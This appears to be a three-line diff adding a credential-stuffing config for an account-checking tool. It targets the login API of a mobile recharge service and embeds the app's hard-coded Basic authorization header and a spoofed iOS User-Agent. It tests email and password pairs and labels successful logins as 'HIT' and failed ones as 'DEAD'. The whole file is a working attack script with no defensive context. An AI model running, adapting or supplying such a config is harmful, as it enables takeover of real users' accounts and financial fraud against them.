@@ -1,0 +1,3 @@
+BLOCK=REQUEST-1|TYPE=POST|URL=https://mobileapi.keepcalling.net/mobile_api/app_api.php|HEADERS={"method": "POST", "path": "/mobile_api/app_api.php", "Host": "mobileapi.keepcalling.net", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive", "Accept": "*/*", "User-Agent": "iOS/Mobile Recharge/3.1.35/iPhone10,6/16.3", "Authorization": "Basic aW9zOjg3cXA0c3ltcGhyczRoMm1tNmp5OGJ1YXA0NnR5bmo0", "Content-Length": "78", "Accept-Language": "es-419,es;q=0.9"}|CONTENT={"method":"authenticate","params":[355,"<EMAIL>","<PASSWORD>"]}
+BLOCK=RESULT|VAR=<REQUEST-1.text>|VALUE=successful|CATEGORY=HIT
+BLOCK=RESULT|VAR=<REQUEST-1.text>|VALUE=failed|CATEGORY=DEAD
